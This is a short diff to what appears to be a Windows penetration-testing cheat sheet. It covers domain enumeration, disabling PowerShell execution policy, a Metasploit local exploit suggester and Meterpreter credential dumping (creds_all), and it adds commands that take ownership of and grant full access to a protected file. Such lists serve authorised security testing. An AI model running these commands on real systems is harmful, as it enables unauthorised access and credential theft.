@@ -914,9 +914,7 @@ takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheri
 dir C:\inetpub\wwwroot
 dir C:\xampp
 
-
-
-
++---------- Other ----------+
 Get-WmiObject -Class Win32_ComputerSystem | Select-Object Domain
 Get-ADComputer -Filter * | Select-Object Name
 systeminfo | Select-String "Domain"
@@ -924,7 +922,6 @@ net view
 net group "Domain Computers" /domain
 net view /domain
 net user /domain
-
 wmic useraccount get name,sid
 powershell -c "Set-ExecutionPolicy unrestricted"
 services.msc
@@ -958,6 +955,10 @@ powershell_execute "Start-ScheduledTask -TaskName 'Ownership'"
 
 +---------- Exploit Suggester ----------+
 run multi/recon/local_exploit_suggester
+
++---------- File Permissions ----------+
+powershell_execute "(Get-Acl 'C:\secret.txt').Access | Format-Table"
+powershell_execute "takeown /f 'C:\secret.txt' && icacls 'C:\secret.txt' /grant %USERNAME%:F /inheritance:e"
 
 +---------- Dumping ----------+
 creds_all
